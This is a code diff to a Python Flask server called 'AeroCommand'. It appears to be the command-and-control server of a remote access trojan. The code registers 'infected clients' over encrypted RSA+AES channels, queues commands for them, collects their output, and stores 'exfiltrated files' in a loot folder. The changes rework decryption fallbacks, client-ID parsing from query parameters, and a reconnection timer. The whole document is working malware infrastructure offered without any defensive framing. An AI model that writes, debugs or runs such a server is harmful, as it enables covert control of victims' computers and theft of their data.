@@ -157,46 +157,56 @@ def decrypt_aes(raw_b64: str, aes_key: bytes) -> str:
 
 def decrypt_payload(client_id=None):
     """Decrypt incoming AES-encrypted request body using client's session key"""
-    raw = request.get_data(as_text=True)
-    if not raw:
-        return {}
+    # Allow client_id from query params (for /result and /upload)
+    if not client_id:
+        client_id = request.args.get("id")
+
+    # 1. Try to get JSON directly (handles application/json)
+    data = request.get_json(silent=True)
     
-    # If client_id is known and has an active AES session key
-    aes_key = None
-    if client_id and client_id in client_sessions:
-        aes_key = client_sessions[client_id]
-    
-    if aes_key:
+    # 2. If not JSON, get raw data (handles application/octet-stream)
+    if not data:
+        raw = request.get_data(as_text=True)
+        if not raw:
+            return {}
         try:
-            decrypted = decrypt_aes(raw, aes_key)
-            return json.loads(decrypted)
-        except Exception as e:
-            pass
-            
-    # Fallback for registration or handshake where payload includes encrypted session key
-    try:
-        data = json.loads(raw)
-        if "encrypted_session_key" in data and "payload" in data:
-            # Decrypt AES session key with Server's RSA private key
+            # Check if it's a plain JSON string
+            data = json.loads(raw)
+        except:
+            # If not JSON, it must be encrypted binary
+            aes_key = client_sessions.get(client_id) if client_id else None
+            if aes_key:
+                try:
+                    decrypted = decrypt_aes(raw, aes_key)
+                    return json.loads(decrypted)
+                except Exception as e:
+                    print(f"[!] AES Decryption failed: {e}")
+            return {}
+
+    # 3. Handle Hybrid RSA+AES (Registration)
+    if isinstance(data, dict) and "encrypted_session_key" in data and "payload" in data:
+        try:
+            print("[*] Processing hybrid RSA+AES registration packet...")
             rsa_cipher = PKCS1_OAEP.new(server_rsa_key)
             enc_session_key = base64.b64decode(data["encrypted_session_key"])
             aes_key = rsa_cipher.decrypt(enc_session_key)
             
-            # Register session key if client_id is provided in inner or outer payload
-            inner_payload = json.loads(decrypt_aes(data["payload"], aes_key))
+            decrypted_inner = decrypt_aes(data["payload"], aes_key)
+            inner_payload = json.loads(decrypted_inner)
+            
             cid = inner_payload.get("client_id")
             if cid:
                 with session_lock:
                     client_sessions[cid] = aes_key
+                print(f"[+] AES session key established for client: {cid}")
             return inner_payload
-    except Exception:
-        pass
+        except Exception as e:
+            print(f"[!] Hybrid Decryption failed: {e}")
+            import traceback
+            traceback.print_exc()
+            return {}
 
-    # Final fallback: plain JSON for legacy clients
-    try:
-        return request.get_json(force=True)
-    except Exception:
-        return {}
+    return data if isinstance(data, dict) else {}
 
 def encrypt_response(data, client_id=None):
     """Encrypt outgoing response dict using client's AES session key or fallback to JSON"""
@@ -221,6 +231,7 @@ class C:
 
 LOOT_DIR = "loot"
 HEARTBEAT_TIMEOUT = 60  # seconds — mark client dead if no heartbeat
+_client_connected_event = threading.Event()  # Signals input thread when a client registers
 PROMPT = f"{C.RED}⚡ AeroCommand > {C.RESET}"
 
 # ========== ROUTES ==========
@@ -239,7 +250,20 @@ def get_rsa_pub():
 def register():
     global target_client
     info = decrypt_payload()
-    client_id = info.get("client_id", f"{info['ip']}:{info['pid']}")
+    if not info:
+        print(f"[!] Registration failed for {request.remote_addr}: No data received or decryption failed.")
+        print(f"[DEBUG] Raw data: {request.get_data(as_text=True)}")
+        return "Invalid Data", 400
+        
+    client_id = info.get("client_id")
+    if not client_id:
+        ip = info.get('ip', request.remote_addr)
+        pid = info.get('pid', 'unknown')
+        client_id = f"{ip}:{pid}"
+        # Ensure client_id is in the dict for downstream functions
+        info['client_id'] = client_id
+        
+    print(f"[*] Registration request received from: {client_id}")
     now = datetime.now()
     new_host = info.get('host', 'unknown')
     new_ip = info.get('ip', 'unknown')
@@ -277,7 +301,7 @@ def register():
         replaced_msg = f" {C.YELLOW}(replaced stale session){C.RESET}" if stale_ids else ""
         print(f"\n{C.GREEN}[✓] NEW CLIENT CONNECTED:{C.RESET} {new_host} ({new_ip}) - PID: {info.get('pid', '?')}{admin_tag}{replaced_msg}")
         print(f"{C.CYAN}[•] Total clients: {len(infected_clients)}{C.RESET}\n")
-        show_clients()
+        _client_connected_event.set()
         print(PROMPT, end="", flush=True)
 
     return "OK", 200
@@ -308,17 +332,9 @@ def get_command():
 
 @app.route("/result", methods=["POST"])
 def post_result():
-    # Pre-parse client_id from raw JSON if possible, or pass None
-    raw_peek = request.get_data(as_text=True)
-    cid_peek = None
-    try:
-        # Check if it's already decrypted or we can extract client_id
-        parsed_peek = json.loads(raw_peek)
-        if isinstance(parsed_peek, dict):
-            cid_peek = parsed_peek.get("client_id")
-    except Exception:
-        pass
-    data = decrypt_payload(client_id=cid_peek)
+    # client_id passed as query param by client
+    cid_from_param = request.args.get("id")
+    data = decrypt_payload(client_id=cid_from_param)
     output = data.get('output', '')
     client_id = data.get('client_id', request.remote_addr)
     timestamp = datetime.now().strftime("%H:%M:%S")
@@ -341,15 +357,8 @@ def post_result():
 @app.route("/upload", methods=["POST"])
 def upload_file():
     """Receive exfiltrated files from clients"""
-    raw_peek = request.get_data(as_text=True)
-    cid_peek = None
-    try:
-        parsed_peek = json.loads(raw_peek)
-        if isinstance(parsed_peek, dict):
-            cid_peek = parsed_peek.get("client_id")
-    except Exception:
-        pass
-    data = decrypt_payload(client_id=cid_peek)
+    cid_from_param = request.args.get("id")
+    data = decrypt_payload(client_id=cid_from_param)
     filename = data.get("name", "unknown")
     file_data = base64.b64decode(data.get("file", ""))
     client_id = data.get("client_id", request.remote_addr)
@@ -611,16 +620,17 @@ def input_thread_func():
     show_banner()
     show_help()
 
-    # Initial reconnection window
-    sys.stdout.write(f"\r{C.CYAN}[*] Waiting 5s for active endpoints to reconnect...{C.RESET}")
-    sys.stdout.flush()
+    # Initial reconnection window — breaks early if a client connects
     for i in range(5, 0, -1):
+        if _client_connected_event.is_set():
+            break
         sys.stdout.write(f"\r{C.CYAN}[*] Waiting {i}s for active endpoints to reconnect...{C.RESET}")
         sys.stdout.flush()
         time.sleep(1)
 
     sys.stdout.write("\r" + " " * 65 + "\r")  # Clear timer line
     sys.stdout.flush()
+    _client_connected_event.clear()
     show_clients()
 
     while True:
